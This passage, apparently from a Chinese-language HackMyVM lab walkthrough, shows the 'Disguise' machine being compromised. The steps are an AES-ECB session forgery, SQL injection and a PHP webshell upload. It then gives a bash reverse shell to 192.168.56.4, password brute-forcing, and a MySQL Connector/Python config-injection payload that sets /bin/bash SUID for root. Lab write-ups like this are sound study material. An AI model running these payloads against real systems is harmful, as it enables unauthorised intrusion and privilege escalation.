language-bash\"\u003e// aaaaaaaa(8) + salt(4) + /x04/x04/x04/x04 5SKl5Bbstz3e0GrQ8QBCkA== 8\n// aaaaaaaaaaaa(12) + salt(4) + \u0026#x3C;填充一个数据块\u003e FUoxH12UY/N58pkbRNAAf8JwkfrsOdSxW16pbszGJLY= 12\n// aaaaaaaaaaa(11) + salt(4) + /x01\n// aaaaaaaaaaaaaaaaaaaaaaaaaaaa(28) + salt(4) + \u0026#x3C;填充一个数据块\u003e FUoxH12UY%2FN58pkbRNAAf0Kfd1bvz3G39ZMOl2HnjTHCcJH67DnUsVteqW7MxiS2 28\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们要构造 \u003ccode\u003esimpleAdmin\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esimpleAdmin(11) + salt(4) = 15\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们给它填满到\u003ccode\u003e16\u003c/code\u003e，让其多填充一个数据块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esimpleAdmin(11) + salt(4) + /x01 = 16 + \u0026#x3C;填充一个数据块\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后就能泄露 \u003ccode\u003esimpleAdmin\u003c/code\u003e 的\u003ccode\u003eSession\u003c/code\u003e值\u003c/p\u003e\n\u003cp\u003e注册\u003ccode\u003esimpleAdmin%01\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录\u003ccode\u003esimpleAdmin%01\u003c/code\u003e 后抓到包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e取前面 \u003ccode\u003e16\u003c/code\u003e 个字节进行 base64 加密 和 URL编码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们回到浏览器刷新 \u003ccode\u003eprofile.php\u003c/code\u003e页面，更换 \u003ccode\u003edark_session\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功进来到 \u003ccode\u003esimpleAdmin\u003c/code\u003e 的后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击管理后台 ，有添加商品窗口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e文件上传 \u0026#x26; SQL 注入\u003c/h3\u003e\n\u003cp\u003e看样子可以上传图片\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e常规操作，上传一张普通图片，在图片内容添加上 \u003ccode\u003ephpinfo\u003c/code\u003e ，然后发送\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是并没有找到图片的路径，主页上图片点开貌似是通过文件包含的，经过测试，没找到漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试一下其他参数，在文件名的部分加上单引号发现存在\u003ccode\u003eSQL\u003c/code\u003e注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且将文件路径爆了出来，访问一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以成功解析，上传一句话木马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反弹 \u003ccode\u003eShell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e1=system(\u003cspan class=\"hljs-string\"\u003e'%2Fbin%2Fbash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.4%2F1234+0%3E%261%22'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Darksoul\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e拿到 shell 先将其进行升级为交互式的：\u003ca href=\"https://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\"\u003ehttps://sunsetaction.top/2025/04/21/%E5%8F%8D%E5%BC%B9%20shell%20%E5%8D%87%E7%BA%A7/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e查看一下 \u003ccode\u003econfig\u003c/code\u003e 文件，后面三位是被遮住的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@disguise:/var/www/dark$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.php \n\u0026#x3C;?php\n\n\u003cspan class=\"hljs-variable\"\u003e$DB_USER\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'dark_db_admin'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$DB_PASS\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'Str0ngPassw0d1***'\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$DB_NAME\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'dark_shop'\u003c/span\u003e;\n\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@disguise:/var/www/dark$ ss -tulpn\nNetid                     State                      Recv-Q                     Send-Q                                           Local Address:Port                                           Peer Address:Port\nudp                       UNCONN                     0                          0                                                      0.0.0.0:68                                                  0.0.0.0:*\ntcp                       LISTEN                     0                          80                                                   127.0.0.1:3306                                                0.0.0.0:*\ntcp                       LISTEN                     0                          128                                                    0.0.0.0:22                                                  0.0.0.0:*\ntcp                       LISTEN                     0                          128                                                          *:80                                                        *:*\ntcp                       LISTEN                     0                          128                                                       [::]:22                                                     [::]:* \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ccode\u003edarksoul\u003c/code\u003e 家目录也能找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@disguise:/home/darksoul$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.ini \n[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e密码爆破\u003c/h3\u003e\n\u003cp\u003e首先生成密码，后面三位可能是一致的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@disguise:/home/darksoul$ \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e python\n/usr/bin/python\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e列出所有可用字符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eww-data@disguise:/home/darksoul$ python\nPython 2.7.16 (default, Mar 23 2024, 18:55:36) \n[GCC 8.3.0] on linux2\nType \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"copyright\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"credits\"\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\n\u003e\u003e\u003e import string\n\u003e\u003e\u003e \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(string.printable)\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u003cspan class=\"hljs-string\"\u003e\"#$%\u0026#x26;'()*+,-./:;\u0026#x3C;=\u003e?@[\\]^_`{|}~ \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e写脚本生成字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edef generate_password_dict():\n    prefix = \u003cspan class=\"hljs-string\"\u003e\"Str0ngPassw0d1\"\u003c/span\u003e\n    \n    chars = r\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"\u003c/span\u003e#$%\u0026#x26;\u003cspan class=\"hljs-string\"\u003e'()*+,-./:;\u0026#x3C;=\u003e?@[\\]^_`{|}~\"\"\"\n    \n    with open(\"passwords.txt\", \"w\") as f:\n        for char in chars:\n            password = prefix + char*3 + \"\\n\"\n            f.write(password)\n\nif __name__ == \"__main__\":\n    generate_password_dict()\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003esuForce\u003c/code\u003e 进行爆破\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e加目录下能发现\u003ccode\u003euser.txt\u003c/code\u003e..?\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edarksoul@disguise:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nGood good study \u0026#x26; Day day up,but \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e is the flag?\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试寻找一下，找到 \u003ccode\u003ehmv{hiddenflag}\u003c/code\u003e ，被隐藏在 user.txt 里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edarksoul@disguise:~$ grep -rE \u003cspan class=\"hljs-string\"\u003e'flag'\u003c/span\u003e ./ 2\u003e/dev/null\n./user.txt:Good good study \u0026#x26; Day day up,but \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e is the flag?\n./user.txt:hmv{hiddenflag}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e实际上使用 \u003ccode\u003exxd\u003c/code\u003e 也可以看到\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传 \u003ccode\u003epspy64\u003c/code\u003e 查看进程\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e2025/05/13 03:12:32 CMD: UID=0     PID=1      | /sbin/init splash \n2025/05/13 03:13:01 CMD: UID=0     PID=1884   | /usr/sbin/CRON -f \n2025/05/13 03:13:01 CMD: UID=0     PID=1885   | /usr/sbin/CRON -f \n2025/05/13 03:13:02 CMD: UID=0     PID=1886   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini \n2025/05/13 03:13:02 CMD: UID=0     PID=1887   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini \n2025/05/13 03:13:02 CMD: UID=0     PID=1888   | /bin/sh -c \u003cspan class=\"hljs-built_in\"\u003euname\u003c/span\u003e -p 2\u003e /dev/null \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能看到一段时间就运行 \u003ccode\u003epython\u003c/code\u003e 脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edarksoul@disguise:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /opt/query.py \n-rw-r--r-- 1 root root 870 Apr  1 09:56 /opt/query.py\ndarksoul@disguise:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /opt/query.py \nimport mysql.connector\nimport sys\n\ndef main():\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e len(sys.argv) != 2:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Usage: python query.py \u0026#x3C;configfile\u003e\"\u003c/span\u003e)\n        sys.exit(1)\n\n    cnf = sys.argv[1]\n\n    try:\n        conn = mysql.connector.connect(read_default_file=cnf)\n        cursor = conn.cursor()\n\n        query = \u003cspan class=\"hljs-string\"\u003e'SELECT COUNT(*) FROM users'\u003c/span\u003e\n        cursor.execute(query)\n        results = cursor.fetchall()\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"users count:{results[0][0]}\"\u003c/span\u003e)\n\n        query = \u003cspan class=\"hljs-string\"\u003e'SELECT COUNT(*) FROM products'\u003c/span\u003e\n        cursor.execute(query)\n        results = cursor.fetchall()\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"products count:{results[0][0]}\"\u003c/span\u003e)\n    except mysql.connector.Error as err:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"db connect error: {err}\"\u003c/span\u003e)\n    finally:\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e locals():\n            cursor.close()\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'conn'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e locals() and conn.is_connected():\n            conn.close()\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    main()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003eread_default_file=cnf\u003c/code\u003e参数从指定路径的MySQL配置文件中读取连接参数\u003c/p\u003e\n\u003cp\u003e执行\u003ccode\u003eSELECT COUNT(*)\u003c/code\u003e查询用户表和产品表的记录总数，结果通过\u003ccode\u003efetchall()\u003c/code\u003e获取\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eprint\u003c/code\u003e直接输出统计值，符合简单计数场景需求\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003efinally\u003c/code\u003e块中显式关闭游标和连接，防止资源泄漏\u003c/p\u003e\n\u003ch3\u003epython.connector\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e/opt\u003c/code\u003e 无法写入，模块也都是只读，但是\u003ccode\u003econfig.ini\u003c/code\u003e我们是可控的\u003c/p\u003e\n\u003cp\u003e查看一下官方文档：\u003ca href=\"https://dev.mysql.com/doc/connector-python/en/\"\u003ehttps://dev.mysql.com/doc/connector-python/en/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e在：\u003ca href=\"https://dev.mysql.com/doc/connector-python/en/connector-python-opentelemetry.html\"\u003ehttps://dev.mysql.com/doc/connector-python/en/connector-python-opentelemetry.html\u003c/a\u003e 中，可以找到配置文件中有如下代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e配置文件中可以执行\u003ccode\u003epy\u003c/code\u003e语句，我们看一下\u003ccode\u003econfig\u003c/code\u003e 的连接参数：\u003ca href=\"https://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html\"\u003ehttps://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e但是也并没有找到可利用的方法\u003c/p\u003e\n\u003cp\u003e最后在 微信 搜一搜找到了：\u003ca href=\"https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w%EF%BC%88%E8%BF%99%E6%96%87%E7%AB%A0%E4%B9%8B%E5%89%8D%E8%BF%98%E7%9C%8B%E8%BF%87%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BF%98%E8%AE%B0%E4%BA%86..%EF%BC%89\"\u003ehttps://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w（这文章之前还看过，然后忘记了..）\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// POC\n[incorrect_config]\nuser=root\npassword=mypass\ndatabase=cpydata\nport=int(3306)\nallow_local_infile=__import__(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).system(\u003cspan class=\"hljs-string\"\u003e'calc'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[client]\nuser = dark_db_admin\npassword = Str0ngPassw0d1***\nhost = localhost\ndatabase = dark_shop\nport = int(3306)\nallow_local_infile=__import__(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).system(\u003cspan class=\"hljs-string\"\u003e'chmod u+s /bin/bash'\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获取 \u003ccode\u003eroot shell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edarksoul@disguise:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /bin/bash\n-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash\ndarksoul@disguise:~$ /bin/bash -p\nbash-5.0# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-5.0# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n\u003cspan class=\"hljs-comment\"\u003e#Congratulations!!!\u003c/span\u003e\nhmv{CVE-2025-21548}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e涉及到密码学，通过\u003ccode\u003eAES-128-ECB\u003c/code\u003e的局限性来伪造 Session，这一部分算是知识盲区了。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDisguise/EDM-3x.gif\" alt=\"EDM-3x.gif\"\u003e\u003c/p\u003e","title":"HackMyVM - Disguise","date":"2025-05-13","updated":"2025-05-13","tags":["HackMyVM","Linux靶机","Crypto","AES","Brute","Mysql","Hidden"],"categories":"靶机","comments":true,"description":"Disguise.\n\n https://hackmyvm.eu/machines/machine.php?vm=Disguise\n \n\nNotes：A machine that simulates a real environment, please be careful and have fun.\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\nWordPess\n\n看到 `nmap` 版本探测中扫描出..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"05","day":"13","id":"HackMyVMDisguise"},"buildId":"Fp5Bh2sJwXWhfuP5BHETu","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>